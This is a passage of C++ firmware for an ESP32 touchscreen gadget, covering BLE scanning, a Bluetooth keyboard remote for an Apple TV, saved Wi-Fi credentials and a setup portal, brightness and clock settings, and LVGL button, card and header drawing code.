                          wifi_ping_min_ms == UINT32_MAX ? 0 : wifi_ping_min_ms, average, wifi_ping_max_ms);
    if (wifi_ping_handle != NULL) {
      esp_ping_delete_session(wifi_ping_handle);
      wifi_ping_handle = NULL;
    }
    set_status("SYSTEM READY", COLOR_READY);
  }
}


void scan_nearby_ble(lv_event_t *e) {
  if (ble_info_label == NULL) return;

  if (bluetooth_connected) {
    lv_label_set_text(ble_info_label,
                      "Apple TV is connected.\nDisconnect it before scanning so\nits control connection is not interrupted.");
    set_status("SYSTEM READY", COLOR_READY);
    return;
  }

  if (!ensure_ble_stack()) {
    lv_label_set_text(ble_info_label,
                      "BLE RADIO HELD SAFELY\n\nThe full interface does not have\nenough free internal RAM to start\nBluetooth without a reboot.\n\nBLE will be moved to a lighter\nstartup path next.");
    set_status("SYSTEM READY", COLOR_READY);
    return;
  }

  lv_label_set_text(ble_info_label, "SCANNING NEARBY BLE DEVICES...\nPlease wait a few seconds.");
  set_status("LISTENING", COLOR_BLUETOOTH);
  Serial.println("BLE scan started");

  if (bluetooth_ready) {
    NimBLEDevice::stopAdvertising();
    refresh_connection_indicators();
  }
  NimBLEScan *scanner = NimBLEDevice::getScan();
  if (scanner == NULL) {
    lv_label_set_text(ble_info_label, "BLE scanner unavailable.");
    set_status("SYSTEM READY", COLOR_READY);
    return;
  }

  scanner->stop();
  scanner->clearResults();
  scanner->setActiveScan(true);
  scanner->setInterval(50);
  scanner->setWindow(40);
  scanner->setMaxResults(8);

  NimBLEScanResults results = scanner->getResults(4);
  const int found = results.getCount();
  char report[420];

  if (found <= 0) {
    snprintf(report, sizeof(report), "No nearby BLE devices found.\nTry again closer to a device.");
  } else {
    int used = snprintf(report, sizeof(report), "BLUETOOTH SCAN  |  %d FOUND\n",
                        found);
    const uint8_t display_count = found > 3 ? 3 : (uint8_t)found;
    for (uint8_t i = 0; i < display_count && used < (int)sizeof(report) - 1; i++) {
      const NimBLEAdvertisedDevice *device = results.getDevice(i);
      std::string name = device != NULL ? device->getName() : "";
      const char *shown_name = name.empty() ? "Unnamed BLE device" : name.c_str();
      const int rssi = device != NULL ? device->getRSSI() : 0;
      used += snprintf(report + used, sizeof(report) - used,
                       "%u. %.18s\n   %d dBm  %s\n", i + 1, shown_name, rssi,
                       wifi_radar_strength_label(rssi));
    }
    if (found > display_count && used < (int)sizeof(report) - 1) {
      snprintf(report + used, sizeof(report) - used, "+ %d more", found - display_count);
    }
  }

  scanner->clearResults();
  if (bluetooth_ready) {
    NimBLEDevice::startAdvertising();
    refresh_connection_indicators();
  }
  lv_label_set_text(ble_info_label, report);
  Serial.printf("BLE scan found %d device(s)\n", found);
  set_status("SYSTEM READY", COLOR_READY);
}


void bluetooth_pair(lv_event_t *e) {
  const bool started = start_bluetooth_keyboard();
  refresh_bluetooth_screen();
  if (started) {
    Serial.println("Bluetooth pair request: advertising as RipperZero Remote");
  } else {
    Serial.println("Bluetooth pair request: not started; see screen for reason");
  }
}


void bluetooth_up(lv_event_t *e) { send_bluetooth_key(0x52); }       // Up Arrow
void bluetooth_down(lv_event_t *e) { send_bluetooth_key(0x51); }     // Down Arrow
void bluetooth_left(lv_event_t *e) { send_bluetooth_key(0x50); }     // Left Arrow
void bluetooth_right(lv_event_t *e) { send_bluetooth_key(0x4F); }    // Right Arrow
void bluetooth_select(lv_event_t *e) { send_bluetooth_key(0x28); }  // Enter
void bluetooth_back(lv_event_t *e) { send_bluetooth_key(0x29); }    // Escape
void bluetooth_play_pause(lv_event_t *e) { send_bluetooth_key(0x2C); } // Space


void open_saved(
  lv_event_t *e
) {
#if RIPPER_SAFE_HOME_RECOVERY
  (void)e;
  Serial.println("SAFE RECOVERY: saved-remotes screen held");
  return;
#endif
  if (saved_hub_screen == NULL) create_saved_hub_screen();
  refresh_saved_hub();
  lv_scr_load(saved_hub_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void open_settings(
  lv_event_t *e
) {
#if RIPPER_SAFE_HOME_RECOVERY
  (void)e;
  Serial.println("SAFE RECOVERY: settings screen held");
  return;
#endif

  lv_scr_load(
    settings_screen
  );

  set_status(
    "SYSTEM READY",
    COLOR_READY
  );
}

void refresh_wifi_credentials_screen() {
  if (wifi_credentials_status_label == NULL) return;
  wifi_preferences.begin("ripper-wifi", true);
  String saved_ssid = wifi_preferences.getString("ssid", "");
  wifi_preferences.end();
  if (saved_ssid.length() == 0) {
    lv_label_set_text(wifi_credentials_status_label,
                      "NO SAVED NETWORK\n\nUse SETUP PORTAL to add the owner's\n2.4 GHz Wi-Fi credentials.");
  } else {
    lv_label_set_text_fmt(wifi_credentials_status_label,
                          "SAVED NETWORK\n%s\n\nConnection: %s",
                          saved_ssid.c_str(),
                          WiFi.status() == WL_CONNECTED ? "CONNECTED" : "NOT CONNECTED");
  }
}

void open_wifi_credentials_settings(lv_event_t *e) {
  (void)e;
  if (wifi_credentials_screen == NULL) create_wifi_credentials_screen();
  refresh_wifi_credentials_screen();
  lv_scr_load(wifi_credentials_screen);
  set_status("SYSTEM READY", COLOR_READY);
}

void reconnect_saved_wifi(lv_event_t *e) {
  (void)e;
  wifi_preferences.begin("ripper-wifi", true);
  String saved_ssid = wifi_preferences.getString("ssid", "");
  String saved_password = wifi_preferences.getString("password", "");
  wifi_preferences.end();
  if (saved_ssid.length() == 0) {
    lv_label_set_text(wifi_credentials_status_label,
                      "NO SAVED NETWORK\nUse SETUP PORTAL first.");
    return;
  }
  if (wifi_enter_operating_state(WIFI_OP_STA_CONNECTING)) {
    WiFi.begin(saved_ssid.c_str(), saved_password.c_str());
    lv_label_set_text_fmt(wifi_credentials_status_label,
                          "CONNECTING TO\n%s", saved_ssid.c_str());
    set_status("CONNECTING", COLOR_SETTINGS);
  }
}

void open_saved_wifi_setup_portal(lv_event_t *e) {
  (void)e;
  start_wifi_ap_services(true);
  if (!wifi_ap_service_running) {
    lv_label_set_text(wifi_credentials_status_label,
                      "SETUP PORTAL COULD NOT START");
    return;
  }
  lv_label_set_text_fmt(wifi_credentials_status_label,
                        "RIPPER SETUP IS ACTIVE\nNetwork: Ripper-Setup\nPassword: %s\nOpen: http://%s",
                        wifi_control_password(), WiFi.softAPIP().toString().c_str());
}

void forget_saved_wifi(lv_event_t *e) {
  (void)e;
  stop_wifi_ap_services();
  WiFi.disconnect(true, true);
  wifi_preferences.begin("ripper-wifi", false);
  wifi_preferences.remove("ssid");
  wifi_preferences.remove("password");
  wifi_preferences.end();
  wifi_saved_connection_attempted = false;
  wifi_operating_state = WIFI_OP_IDLE;
  refresh_wifi_credentials_screen();
  set_status("SYSTEM READY", COLOR_READY);
}

void refresh_brightness_screen() {
  if (brightness_value_label == NULL) return;
  char text[32];
  snprintf(text, sizeof(text), "%u%%", display_brightness);
  lv_label_set_text(brightness_value_label, text);
}

void open_brightness_settings(lv_event_t *e) {
  if (brightness_screen == NULL) create_brightness_screen();
  refresh_brightness_screen();
  lv_scr_load(brightness_screen);
  set_status("BRIGHTNESS", COLOR_SETTINGS);
}

void change_brightness(int change) {
  display_brightness = constrain((int)display_brightness + change, 10, 100);
  apply_display_brightness(display_brightness);
  save_display_brightness();
  refresh_brightness_screen();
}

void decrease_brightness(lv_event_t *e) { change_brightness(-10); }
void increase_brightness(lv_event_t *e) { change_brightness(10); }

void refresh_clock_edit_screen() {
  if (clock_edit_value_label == NULL || clock_edit_field_label == NULL) return;
  const char *field_names[] = { "YEAR", "MONTH", "DAY", "HOUR", "MINUTE" };
  RTC_DateTime edited(clock_edit_year, clock_edit_month, clock_edit_day,
                      clock_edit_hour, clock_edit_minute, 0);
  char text[40];
  char field_text[28];
  format_clock_text(text, sizeof(text), edited, true);
  snprintf(field_text, sizeof(field_text), "EDITING: %s", field_names[clock_edit_field]);
  lv_label_set_text(clock_edit_value_label, text);
  lv_label_set_text(clock_edit_field_label, field_text);
}

void open_clock_settings(lv_event_t *e) {
  if (clock_settings_screen == NULL) create_clock_settings_screen();
  if (rtc_ready && rtc.isClockIntegrityGuaranteed()) {
    RTC_DateTime now = rtc.getDateTime();
    if (now.getYear() >= 2020 && now.getYear() <= 2099 &&
        now.getMonth() >= 1 && now.getMonth() <= 12 &&
        now.getDay() >= 1 && now.getDay() <= 31) {
      clock_edit_year = now.getYear();
      clock_edit_month = now.getMonth();
      clock_edit_day = now.getDay();
      clock_edit_hour = now.getHour();
      clock_edit_minute = now.getMinute();
    }
  }
  clock_edit_field = 0;
  refresh_clock_edit_screen();
  lv_scr_load(clock_settings_screen);
  set_status("CLOCK SETTINGS", COLOR_SETTINGS);
}

void clock_previous_field(lv_event_t *e) {
  clock_edit_field = clock_edit_field == 0 ? 4 : clock_edit_field - 1;
  refresh_clock_edit_screen();
}

void clock_next_field(lv_event_t *e) {
  clock_edit_field = (clock_edit_field + 1) % 5;
  refresh_clock_edit_screen();
}

void adjust_clock_value(int direction) {
  switch (clock_edit_field) {
    case 0: clock_edit_year = constrain((int)clock_edit_year + direction, 2020, 2099); break;
    case 1:
      clock_edit_month = direction > 0 ? (clock_edit_month == 12 ? 1 : clock_edit_month + 1)
                                       : (clock_edit_month == 1 ? 12 : clock_edit_month - 1);
      break;
    case 2: {
      uint8_t limit = days_in_clock_month(clock_edit_year, clock_edit_month);
      clock_edit_day = direction > 0 ? (clock_edit_day >= limit ? 1 : clock_edit_day + 1)
                                     : (clock_edit_day <= 1 ? limit : clock_edit_day - 1);
      break;
    }
    case 3: clock_edit_hour = direction > 0 ? (clock_edit_hour + 1) % 24
                                             : (clock_edit_hour == 0 ? 23 : clock_edit_hour - 1); break;
    case 4: clock_edit_minute = direction > 0 ? (clock_edit_minute + 1) % 60
                                               : (clock_edit_minute == 0 ? 59 : clock_edit_minute - 1); break;
  }
  uint8_t limit = days_in_clock_month(clock_edit_year, clock_edit_month);
  if (clock_edit_day > limit) clock_edit_day = limit;
  refresh_clock_edit_screen();
}

void clock_decrease_value(lv_event_t *e) { adjust_clock_value(-1); }
void clock_increase_value(lv_event_t *e) { adjust_clock_value(1); }

void clock_toggle_format(lv_event_t *e) {
  clock_24_hour = !clock_24_hour;
  save_clock_format();
  refresh_clock_edit_screen();
  refresh_home_clock();
}

void clock_save(lv_event_t *e) {
  if (rtc_ready) {
    rtc.setDateTime(RTC_DateTime(clock_edit_year, clock_edit_month, clock_edit_day,
                                 clock_edit_hour, clock_edit_minute, 0));
    refresh_home_clock();
    set_status("CLOCK SAVED", COLOR_GREEN);
  } else {
    set_status("RTC NOT FOUND", COLOR_RED);
  }
}

void turn_off_device(lv_event_t *e) {
  Serial.println("Manual shutdown requested from Settings");
  set_status("TURNING OFF", COLOR_SETTINGS);
  lv_timer_handler();
  delay(120);
  apply_display_brightness(0);
  gfx->fillScreen(RGB565_BLACK);
  Serial.flush();
  battery_pmu.shutdown();
  delay(500);
  // USB power can keep the ESP32 rail alive after the PMU shuts down, so use
  // deep sleep as the low-drain fallback until power or reset wakes the board.
  esp_deep_sleep_start();
}


// ============================================================
// CREATE BUTTON HELPER
// ============================================================

lv_obj_t *create_button(
  lv_obj_t *parent,
  int x,
  int y,
  int width,
  int height,
  const char *text,
  uint32_t accent_color,
  lv_event_cb_t event_cb
) {

  lv_obj_t *button =
    lv_btn_create(parent);


  lv_obj_set_size(
    button,
    width,
    height
  );


  lv_obj_set_pos(
    button,
    x,
    y
  );


  lv_obj_set_style_pad_all(
    button,
    0,
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_color(
    button,
    lv_color_hex(COLOR_PANEL),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    button,
    LV_OPA_COVER,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_width(
    button,
    1,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_color(
    button,
    lv_color_hex(accent_color == COLOR_RED ? 0x87383F : COLOR_BORDER),
    LV_PART_MAIN
  );


  lv_obj_set_style_radius(
    button,
    10,
    LV_PART_MAIN
  );

  // Keep the resting state visually quiet. Feature colors identify screens
  // and selected states; putting every passed color around every action made
  // mixed-action pages look arbitrary and noisy.
  lv_obj_set_style_shadow_width(
    button,
    3,
    LV_PART_MAIN
  );

  lv_obj_set_style_shadow_color(
    button,
    lv_color_hex(COLOR_SHADOW),
    LV_PART_MAIN
  );

  lv_obj_set_style_shadow_opa(
    button,
    LV_OPA_20,
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_color(
    button,
    lv_color_hex(COLOR_PANEL2),
    LV_STATE_PRESSED
  );

  lv_obj_set_style_border_width(
    button,
    2,
    LV_STATE_PRESSED
  );

  lv_obj_set_style_border_color(
    button,
    lv_color_hex(accent_color),
    LV_STATE_PRESSED
  );

  lv_obj_set_style_shadow_color(
    button,
    lv_color_hex(accent_color),
    LV_STATE_PRESSED
  );

  lv_obj_set_style_shadow_opa(
    button,
    LV_OPA_30,
    LV_STATE_PRESSED
  );

  lv_obj_set_style_shadow_width(
    button,
    2,
    LV_STATE_PRESSED
  );


  if (event_cb != NULL) {

    lv_obj_add_event_cb(
      button,
      event_cb,
      LV_EVENT_CLICKED,
      NULL
    );
  }


  lv_obj_t *label =
    lv_label_create(button);


  lv_label_set_text(
    label,
    text
  );


  lv_obj_set_style_text_color(
    label,
    lv_color_hex(COLOR_TEXT),
    LV_PART_MAIN
  );


  // Full-size action buttons carry the primary reading load on the 3.5-inch
  // display. Keep compact navigation controls at 12 px, but make normal
  // actions visibly larger without changing their touch targets.
  // Scale labels to the available touch target. Compact navigation rows and
  // narrow multi-action rows need a smaller face to avoid wrapping/clipping.
  const size_t label_length = strlen(text);
  const lv_font_t *button_font = &lv_font_montserrat_14;
  if (height >= 44 && width >= 150 && label_length <= 18) {
    button_font = &lv_font_montserrat_16;
  } else if (height < 34 || width < 90 || (label_length > 14 && width < 150)) {
    button_font = &lv_font_montserrat_10;
  } else if (height < 40 || label_length > 18) {
    button_font = &lv_font_montserrat_12;
  }
  lv_obj_set_style_text_font(label, button_font, LV_PART_MAIN);

  lv_obj_set_width(label, width - 16);
  lv_label_set_long_mode(label, LV_LABEL_LONG_WRAP);
  lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);


  lv_obj_center(
    label
  );


  return button;
}


// ============================================================
// CREATE HOME CARD
// ============================================================

void style_thumbnail_piece(
  lv_obj_t *piece,
  uint32_t color,
  bool outlined
) {
  lv_obj_set_style_bg_color(piece, lv_color_hex(color), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(piece, outlined ? LV_OPA_TRANSP : LV_OPA_30, LV_PART_MAIN);
  lv_obj_set_style_border_width(piece, outlined ? 1 : 0, LV_PART_MAIN);
  lv_obj_set_style_border_color(piece, lv_color_hex(color), LV_PART_MAIN);
  lv_obj_set_style_border_opa(piece, outlined ? LV_OPA_40 : LV_OPA_TRANSP, LV_PART_MAIN);
  lv_obj_set_style_radius(piece, 3, LV_PART_MAIN);
}


void create_home_thumbnail(
  lv_obj_t *card,
  const char *symbol,
  uint32_t accent_color
) {
  // Every thumbnail is drawn with basic LVGL shapes, which keeps it sharp on
  // the small display and avoids adding bitmap assets to the firmware.
  if (strcmp(symbol, "RF") == 0 || strcmp(symbol, ">") == 0) {
    // Radar/scan glyph used for RF and Discovery. It reads clearly even at
    // a glance and matches the user-selected radar theme for RF tools.
    for (uint8_t i = 0; i < 3; i++) {
      lv_obj_t *ring = lv_obj_create(card);
      uint8_t size = 14 + i * 13;
      lv_obj_set_size(ring, size, size);
      lv_obj_set_pos(ring, 62 - size / 2, 31 - size / 2);
      style_thumbnail_piece(ring, accent_color, true);
      lv_obj_set_style_radius(ring, LV_RADIUS_CIRCLE, LV_PART_MAIN);
    }
    lv_obj_t *dot = lv_obj_create(card);
    lv_obj_set_size(dot, 5, 5);
    lv_obj_set_pos(dot, 60, 29);
    style_thumbnail_piece(dot, accent_color, false);
    lv_obj_set_style_radius(dot, LV_RADIUS_CIRCLE, LV_PART_MAIN);

    lv_obj_t *sweep = lv_obj_create(card);
    lv_obj_set_size(sweep, 19, 2);
    lv_obj_set_pos(sweep, 62, 18);
    style_thumbnail_piece(sweep, accent_color, false);
  } else if (strcmp(symbol, "IR") == 0) {
    // A small remote body with a button and outgoing waves reads more clearly
    // as "IR remote" than a bare emitter rectangle.
    lv_obj_t *remote = lv_obj_create(card);
    lv_obj_set_size(remote, 18, 30);
    lv_obj_set_pos(remote, 43, 13);
    style_thumbnail_piece(remote, accent_color, true);

    lv_obj_t *remote_button = lv_obj_create(card);
    lv_obj_set_size(remote_button, 5, 5);
    lv_obj_set_pos(remote_button, 49, 20);
    style_thumbnail_piece(remote_button, accent_color, false);

    for (uint8_t i = 0; i < 3; i++) {
      lv_obj_t *beam = lv_obj_create(card);
      lv_obj_set_size(beam, 8 + i * 5, 2);
      lv_obj_set_pos(beam, 68, 16 + i * 8);
      style_thumbnail_piece(beam, accent_color, false);
    }
  } else if (strcmp(symbol, "WiFi") == 0) {
    // Three expanding arcs make the Wi-Fi tool immediately recognizable.
    lv_obj_t *dot = lv_obj_create(card);
    lv_obj_set_size(dot, 6, 6);
    lv_obj_set_pos(dot, 58, 34);
    style_thumbnail_piece(dot, accent_color, false);
    lv_obj_set_style_radius(dot, LV_RADIUS_CIRCLE, LV_PART_MAIN);
    for (uint8_t i = 0; i < 3; i++) {
      lv_obj_t *arc = lv_obj_create(card);
      uint8_t size = 16 + i * 11;
      lv_obj_set_size(arc, size, size / 2);
      lv_obj_set_pos(arc, 61 - size / 2, 14 - i * 2);
      style_thumbnail_piece(arc, accent_color, true);
      lv_obj_set_style_radius(arc, 12, LV_PART_MAIN);
    }
  } else if (strcmp(symbol, "BLE") == 0) {
    // A compact Bluetooth rune, drawn from line segments to avoid a font icon.
    const int points[][4] = {
      {60, 13, 60, 46}, {60, 13, 75, 25}, {75, 25, 60, 34},
      {60, 34, 75, 45}, {75, 45, 60, 52}
    };
    for (uint8_t i = 0; i < 5; i++) {
      lv_obj_t *stroke = lv_obj_create(card);
      int dx = points[i][2] - points[i][0];
      int dy = points[i][3] - points[i][1];
      lv_obj_set_size(stroke, abs(dx) + 2, abs(dy) + 2);
      lv_obj_set_pos(stroke, min(points[i][0], points[i][2]), min(points[i][1], points[i][3]));
      style_thumbnail_piece(stroke, accent_color, true);
    }
  } else if (strcmp(symbol, "+") == 0) {
    lv_obj_t *file = lv_obj_create(card);
    lv_obj_set_size(file, 30, 36);
    lv_obj_set_pos(file, 50, 13);
    style_thumbnail_piece(file, accent_color, true);
    for (uint8_t i = 0; i < 3; i++) {
      lv_obj_t *line = lv_obj_create(card);
      lv_obj_set_size(line, 18, 2);
      lv_obj_set_pos(line, 56, 22 + i * 7);
      style_thumbnail_piece(line, accent_color, false);
    }
  } else if (strcmp(symbol, "!") == 0) {
    // A compact TV/power burst glyph for the one-tap TV Power Blast tool.
    lv_obj_t *screen = lv_obj_create(card);
    lv_obj_set_size(screen, 34, 23);
    lv_obj_set_pos(screen, 45, 17);
    style_thumbnail_piece(screen, accent_color, true);

    lv_obj_t *power = lv_obj_create(card);
    lv_obj_set_size(power, 3, 12);
    lv_obj_set_pos(power, 60, 21);
    style_thumbnail_piece(power, accent_color, false);
    for (uint8_t i = 0; i < 3; i++) {
      lv_obj_t *ray = lv_obj_create(card);
      lv_obj_set_size(ray, 8, 2);
      lv_obj_set_pos(ray, 83, 18 + i * 8);
      style_thumbnail_piece(ray, accent_color, false);
    }
  } else {
    for (uint8_t i = 0; i < 3; i++) {
      lv_obj_t *rail = lv_obj_create(card);
      lv_obj_set_size(rail, 34, 2);
      lv_obj_set_pos(rail, 48, 18 + i * 10);
      style_thumbnail_piece(rail, accent_color, false);

      lv_obj_t *knob = lv_obj_create(card);
      lv_obj_set_size(knob, 7, 7);
      lv_obj_set_pos(knob, (i == 1 ? 68 : (i == 2 ? 56 : 76)), 16 + i * 10);
      style_thumbnail_piece(knob, accent_color, false);
    }
  }
}

lv_obj_t *create_home_card(
  lv_obj_t *parent,
  int x,
  int y,
  int width,
  int height,
  const char *symbol,
  const char *title,
  const char *subtitle,
  uint32_t accent_color,
  lv_event_cb_t event_cb
) {

  lv_obj_t *card =
    lv_btn_create(parent);


  lv_obj_set_size(
    card,
    width,
    height
  );


  lv_obj_set_pos(
    card,
    x,
    y
  );


  lv_obj_set_style_pad_all(
    card,
    0,
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_color(
    card,
    lv_color_hex(COLOR_PANEL),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    card,
    LV_OPA_COVER,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_width(
    card,
    1,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_color(
    card,
    lv_color_hex(COLOR_BORDER),
    LV_PART_MAIN
  );


  lv_obj_set_style_radius(
    card,
    14,
    LV_PART_MAIN
  );

  // A vertical rail makes each card feel like an instrument panel and gives
  // the current tool its color identity without changing any touch targets.
  lv_obj_t *card_rail = lv_obj_create(card);
  lv_obj_set_size(card_rail, 3, height - 24);
  lv_obj_set_pos(card_rail, 9, 12);
  lv_obj_set_style_bg_color(card_rail, lv_color_hex(accent_color), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(card_rail, LV_OPA_40, LV_PART_MAIN);
  lv_obj_set_style_border_width(card_rail, 0, LV_PART_MAIN);
  lv_obj_set_style_radius(card_rail, LV_RADIUS_CIRCLE, LV_PART_MAIN);


  lv_obj_set_style_shadow_width(
    card,
    8,
    LV_PART_MAIN
  );


  lv_obj_set_style_shadow_color(
    card,
    lv_color_hex(COLOR_SHADOW),
    LV_PART_MAIN
  );


  lv_obj_set_style_shadow_opa(
    card,
    LV_OPA_20,
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_color(
    card,
    lv_color_hex(COLOR_PANEL2),
    LV_STATE_PRESSED
  );


  lv_obj_set_style_shadow_width(
    card,
    3,
    LV_STATE_PRESSED
  );


  lv_obj_add_event_cb(
    card,
    event_cb,
    LV_EVENT_CLICKED,
    NULL
  );


  // ICON

  lv_obj_t *icon =
    lv_label_create(card);


  lv_label_set_text(
    icon,
    symbol
  );

  // The custom thumbnail below replaces plain text symbols while keeping the
  // original card layout and labels unchanged.
  lv_obj_add_flag(icon, LV_OBJ_FLAG_HIDDEN);
  create_home_thumbnail(card, symbol, accent_color);


  lv_obj_set_style_text_color(
    icon,
    lv_color_hex(accent_color),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    icon,
    &lv_font_montserrat_16,
    LV_PART_MAIN
  );


  lv_obj_align(
    icon,
    LV_ALIGN_TOP_MID,
    0,
    12
  );


  // TITLE

  lv_obj_t *label =
    lv_label_create(card);


  lv_label_set_text(
    label,
    title
  );


  lv_obj_set_style_text_color(
    label,
    lv_color_hex(COLOR_TEXT),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    label,
    &lv_font_montserrat_16,
    LV_PART_MAIN
  );


  lv_obj_align(
    label,
    LV_ALIGN_CENTER,
    0,
    2
  );


  // SUBTITLE

  lv_obj_t *sub =
    lv_label_create(card);


  lv_label_set_text(
    sub,
    subtitle
  );


  lv_obj_set_style_text_color(
    sub,
    lv_color_hex(accent_color),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    sub,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_align(
    sub,
    LV_ALIGN_BOTTOM_MID,
    0,
    -12
  );


  return card;
}


// ============================================================
// CREATE HEADER
// ============================================================

void create_header(
  lv_obj_t *parent,
  const char *title
) {

  lv_obj_t *header =
    lv_obj_create(parent);


  lv_obj_set_size(
    header,
    296,
    52
  );


  lv_obj_align(
    header,
    LV_ALIGN_TOP_MID,
    0,
    10
  );


  lv_obj_set_style_pad_all(
    header,
    0,
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_color(
    header,
    lv_color_hex(COLOR_PANEL),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    header,
    LV_OPA_COVER,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_width(
    header,
    1,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_color(
    header,
    lv_color_hex(0x344152),
    LV_PART_MAIN
  );


  lv_obj_set_style_radius(
    header,
    12,
    LV_PART_MAIN
  );

  lv_obj_t *header_accent =
    lv_obj_create(header);

  lv_obj_set_size(
    header_accent,
    118,
    2
  );

  lv_obj_align(
    header_accent,
    LV_ALIGN_BOTTOM_MID,
    0,
    -5
  );

  lv_obj_set_style_bg_color(
    header_accent,
    lv_color_hex(COLOR_RF),
    LV_PART_MAIN
  );

  lv_obj_set_style_bg_opa(
    header_accent,
    LV_OPA_50,
    LV_PART_MAIN
  );

  lv_obj_set_style_border_width(
    header_accent,
    0,
    LV_PART_MAIN
  );


  lv_obj_t *title_label =
    lv_label_create(header);


  lv_label_set_text(
    title_label,
    title
  );


  lv_obj_set_style_text_color(
    title_label,
    lv_color_hex(COLOR_TEXT),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    title_label,
    &lv_font_montserrat_16,
    LV_PART_MAIN
  );


  // Keep a deliberate gap between the page title and the live clock. Both
  // labels previously met at the same pixel when their full widths were used.
  lv_obj_set_width(title_label, 164);
  lv_label_set_long_mode(title_label, LV_LABEL_LONG_DOT);
  lv_obj_align(title_label, LV_ALIGN_LEFT_MID, 12, -1);

  refresh_header_clocks();
  if (header_clock_count < MAX_HEADER_CLOCKS) {
    lv_obj_t *clock_label = lv_label_create(header);
    header_clock_labels[header_clock_count++] = clock_label;
    lv_obj_set_width(clock_label, 102);
    lv_obj_set_style_text_color(clock_label, lv_color_hex(COLOR_SETTINGS), LV_PART_MAIN);
    lv_obj_set_style_text_font(clock_label, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_set_style_text_align(clock_label, LV_TEXT_ALIGN_RIGHT, LV_PART_MAIN);
    lv_obj_align(clock_label, LV_ALIGN_RIGHT_MID, -9, -1);
    refresh_header_clocks();
  }


  // STATUS DOT

  status_dot =
    lv_obj_create(parent);


  lv_obj_set_size(
    status_dot,
    7,
    7
  );


  lv_obj_set_style_radius(
    status_dot,
    LV_RADIUS_CIRCLE,
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_color(
    status_dot,
    lv_color_hex(COLOR_READY),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    status_dot,
    LV_OPA_COVER,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_width(
    status_dot,
    0,
    LV_PART_MAIN
  );


  lv_obj_align(
    status_dot,
    LV_ALIGN_TOP_LEFT,
    18,
    72
  );


  // STATUS TEXT

  status_label =
    lv_label_create(parent);


  lv_label_set_text(
    status_label,
    "SYSTEM READY"
  );


  lv_obj_set_style_text_color(
    status_label,
    lv_color_hex(COLOR_READY),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    status_label,
    &lv_font_montserrat_14,
    LV_PART_MAIN
  );


  lv_obj_align(
    status_label,
    LV_ALIGN_TOP_LEFT,
    32,
    66
  );


  // This is separate from the activity status on the left: it reflects the
  // actual AXP2101 battery reading when a 3.7 V battery is connected.
  lv_obj_t *battery_label = lv_label_create(parent);
  lv_label_set_text(battery_label, "BAT --");
  lv_obj_set_style_text_color(battery_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(battery_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_align(battery_label, LV_ALIGN_TOP_RIGHT, -10, 66);
  if (battery_indicator_count < MAX_BATTERY_INDICATORS) {
    battery_labels[battery_indicator_count++] = battery_label;
  }
  refresh_battery_indicator();

  // Link badges remain hidden until there is a real association or the user
  // explicitly starts Bluetooth pairing advertising.
  lv_obj_t *wifi_link_label = lv_label_create(parent);
  lv_label_set_text(wifi_link_label, "WIFI");
  lv_obj_set_style_text_color(wifi_link_label, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_link_label, &lv_font_montserrat_12, LV_PART_MAIN);
  // Reserve the right-most portion of this row for the battery. A 100%
  // charging reading is considerably wider than "BAT --", so fixed badges
  // near the right edge used to overlap it after Bluetooth connected.
  lv_obj_align(wifi_link_label, LV_ALIGN_TOP_RIGHT, -157, 68);
  lv_obj_add_flag(wifi_link_label, LV_OBJ_FLAG_HIDDEN);

  lv_obj_t *ble_link_label = lv_label_create(parent);
  lv_label_set_text(ble_link_label, "BT PAIR");
  lv_obj_set_style_text_color(ble_link_label, lv_color_hex(COLOR_BLUETOOTH), LV_PART_MAIN);
  lv_obj_set_style_text_font(ble_link_label, &lv_font_montserrat_12, LV_PART_MAIN);
  // Keep a guaranteed gap from the widest battery string ("BAT 100%+").
  // This also leaves room for WIFI and BT PAIR to be visible together.
  lv_obj_align(ble_link_label, LV_ALIGN_TOP_RIGHT, -105, 68);
  lv_obj_add_flag(ble_link_label, LV_OBJ_FLAG_HIDDEN);

  if (connection_indicator_count < MAX_CONNECTION_INDICATORS) {
    wifi_link_labels[connection_indicator_count] = wifi_link_label;
    ble_link_labels[connection_indicator_count] = ble_link_label;
    connection_indicator_count++;
  }
  refresh_connection_indicators();

  if (status_indicator_count < MAX_STATUS_INDICATORS) {
    status_labels[status_indicator_count] = status_label;
    status_dots[status_indicator_count] = status_dot;
    status_indicator_count++;
  }
}


// ============================================================
// CREATE FOOTER
// ============================================================

void create_footer(
  lv_obj_t *parent
) {

  lv_obj_t *footer =
    lv_obj_create(parent);


  lv_obj_set_size(
    footer,
    296,
    38
  );


  lv_obj_align(
    footer,
    LV_ALIGN_BOTTOM_MID,
    0,
    -8
  );


  lv_obj_set_style_pad_all(
    footer,
    0,
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_color(
    footer,
    lv_color_hex(COLOR_PANEL),
    LV_PART_MAIN
  );


